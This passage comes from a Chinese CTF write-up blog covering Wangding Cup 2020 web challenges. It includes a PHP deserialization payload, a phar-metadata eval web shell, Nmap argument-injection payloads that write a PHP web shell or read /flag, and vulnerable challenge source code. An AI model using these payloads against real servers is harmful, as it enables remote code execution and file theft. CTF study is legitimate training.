    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span>
    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"oavinci"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p><img src="/2021/06/18/wang-ding-bei-2020-areuserialz/image-20210618224356908.png" alt="image-20210618224356908"></p>
]]></content>
      <tags>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯：2020-GameExp</title>
    <url>/2021/09/05/wang-ding-bei-2020-gameexp/</url>
    <content><![CDATA[<p>register.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">AnyClass</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string">'echo "ok";'</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">include_once</span> <span class="token string">"../sqlhelper.php"</span><span class="token punctuation">;</span>
    <span class="token keyword">include_once</span> <span class="token string">"../user.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mysql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">sqlhelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取文件后缀名</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/gif"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/jpg"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/x-png"</span><span class="token punctuation">)</span>
            <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">204800</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 小于 200 kb</span>
        <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension</span><span class="token punctuation">,</span> <span class="token variable">$allowedExts</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$extension</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('文件已经存在');&lt;/script>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span></code></pre>
<p>然后注册页面有个头像上传的功能，大概率是phar触发这个<code>AnyClass</code>的<code>__destruct</code></p>
<p>流程:<br>1.输入转义，白名单加密</p>
<p>2.设置白名单，array(“gif”, “jpeg”, “jpg”, “png”);</p>
<p>3.上传的文件最终文件名<code>filename</code>以<code>username.extension</code>方式命名</p>
<p>4.<code>file_exists</code>检查<code>filename</code>是否存在，可以触发phar</p>
<p>到这里思路大概就出来了，先注册一个用户，上传构造的phar文件，然后再去注册页面那里，利用注册，在<code>username</code>里面传<code>phar://***</code>，后面在进行拼接时会让<code>filename</code>变成<code>phar://***.extension</code>，再用<code>file_exists</code>触发phar</p>
<p>生成phar文件改名1.jpg</p>
<pre><code>&lt;?php
class AnyClass{
var $output = 'eval($_REQUEST[0]);';
}
@unlink("1.phar");
$phar = new Phar("1.phar",0,'1.phar');
$phar-&gt;startBuffering();
$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub，增加gif文件头
$o = new AnyClass();
$phar-&gt;setMetadata($o); //将自定义meta-data存入manifest
$phar-&gt;addFromString("test.jpg", "test"); //添加要压缩的文件
//签名自动计算
$phar-&gt;stopBuffering();
?&gt;</code></pre>
<p>注册</p>
<p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210905010033047.png" alt="image-20210905010033047"></p>
<p>访问login/H3ng.php确保文件成功上传</p>
<p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210905010145382.png" alt="image-20210905010145382"></p>
<p>再回到注册那，<code>username</code>填<code>phar://H3ng</code>，用burp抓包，在Repeater那里Get传参进行命令执行即可</p>
<p><img src="/2021/09/05/wang-ding-bei-2020-gameexp/image-20210906042115649.png" alt="image-20210906042115649"></p>
]]></content>
  </entry>
  <entry>
    <title>网鼎杯:2020-Nmap</title>
    <url>/2021/07/11/wang-ding-bei-2020-nmap/</url>
    <content><![CDATA[<p>这题和Buuctf:2018-OnlineTool类似直接用payload</p>
<pre class=" language-php"><code class="language-php"><span class="token string">' &lt;?= @eval($_POST[1]);?> -oG 1.php '</span></code></pre>
<p>因为PHP被过滤所以采用phtml：</p>
<pre class=" language-PHP"><code class="language-PHP">' <?= @eval($_POST[1]);?> -oG 1.phtml '</code></pre>
<p>蚁剑连接url/1.phtml然后在虚拟终端cat /flag</p>
<p><img src="/2021/07/11/wang-ding-bei-2020-nmap/image-20210712230221620.png" alt="image-20210712230221620"></p>
<p>更简单的方法：</p>
<pre><code>127.0.0.1' -iL /flag -oN 1.txt '</code></pre>
<p><img src="/2021/07/11/wang-ding-bei-2020-nmap/image-20210712230652799.png" alt="image-20210712230652799"></p>
]]></content>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯：2020-Novel</title>
    <url>/2021/08/26/wang-ding-bei-2020-novel/</url>
    <content><![CDATA[<p><img src="/2021/08/26/wang-ding-bei-2020-novel/image-20210824030132161.png" alt="image-20210824030132161"></p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//index.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">defined</span><span class="token punctuation">(</span><span class="token string">'DS'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'DS'</span><span class="token punctuation">,</span> <span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'APP_DIR'</span><span class="token punctuation">,</span> <span class="token function">realpath</span><span class="token punctuation">(</span><span class="token string">'./'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function">autoload_class</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'class'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token constant">APP_DIR</span><span class="token punctuation">.</span><span class="token constant">DS</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token constant">DS</span><span class="token punctuation">.</span><span class="token variable">$class</span><span class="token punctuation">.</span><span class="token string">'.class.php'</span><span class="token punctuation">;</span>
         <span class="token comment" spellcheck="true">//echo $file;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment" spellcheck="true">//echo $file;</span>
            <span class="token keyword">include_once</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$upload_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">,</span><span class="token string">'method'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$param</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$upload_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$param</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token variable">$param</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">// var_dump($upload_config);</span>
    <span class="token keyword">return</span> <span class="token variable">$upload_config</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$home_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$home_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$home_config</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">back</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$copy_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$copy_config</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token string">'autoload_class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$request</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'/'</span><span class="token punctuation">;</span>

<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'get'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">;</span>
<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">;</span>
<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">;</span>

<span class="token variable">$parameters</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$class</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'home'</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//echo $class;</span>
<span class="token variable">$method</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$parameters</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">'index'</span><span class="token punctuation">;</span>
 <span class="token comment" spellcheck="true">//echo $method;</span>

<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$class</span><span class="token punctuation">;</span>
<span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$method</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">,</span><span class="token string">'home'</span><span class="token punctuation">,</span><span class="token string">'back'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$class_init_config</span><span class="token operator">=</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$class</span><span class="token punctuation">,</span> <span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">new</span> <span class="token variable">$class_init_config</span><span class="token punctuation">[</span><span class="token string">'class'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$class_init_config</span><span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>index.php中实现了有一个类自动加载，可以以<code>http://ip/class/method</code>的形式去调用对应类的函数，然后在<code>class</code>文件夹中有三个文件，分别为<code>home.class.php</code>、 <code>upload.class.php</code> 、<code>back.class.php</code>，分别对应主页、上传和备份功能的实现</p>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//back.class.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">back</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$method</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$dest</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dest</span><span class="token operator">=</span><span class="token variable">$config</span><span class="token punctuation">[</span><span class="token string">'dest'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'backup'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">method</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dest</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">backup</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$dest</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">'profile/'</span><span class="token punctuation">.</span><span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$content</span><span class="token operator">=</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">random_code</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_write</span><span class="token punctuation">(</span><span class="token variable">$dest</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_create</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$r</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment" spellcheck="true">/* 先验证保证为备份文件后,再保存为私藏文件 */</span>
    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">_write</span><span class="token punctuation">(</span><span class="token variable">$dest</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$f1</span><span class="token operator">=</span><span class="token variable">$dest</span><span class="token punctuation">;</span>
        <span class="token variable">$f2</span><span class="token operator">=</span><span class="token string">'private/'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">random_code</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".php"</span><span class="token punctuation">;</span>

        <span class="token variable">$stream_f1</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span> <span class="token string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">rewind</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$f1_read</span><span class="token operator">=</span><span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^&lt;\?php \$_GET\[\"password\"\]===\"[a-zA-Z0-9]{8}\"\?print\(\".*\"\):exit\(\); $/s'</span><span class="token punctuation">,</span> <span class="token variable">$f1_read</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$f1</span><span class="token punctuation">,</span><span class="token variable">$f2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   
            <span class="token keyword">return</span> <span class="token variable">$f2</span><span class="token punctuation">;</span>     
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">,</span> <span class="token string">'&lt;?php exit(); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$stream_f1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

    <span class="token punctuation">}</span>

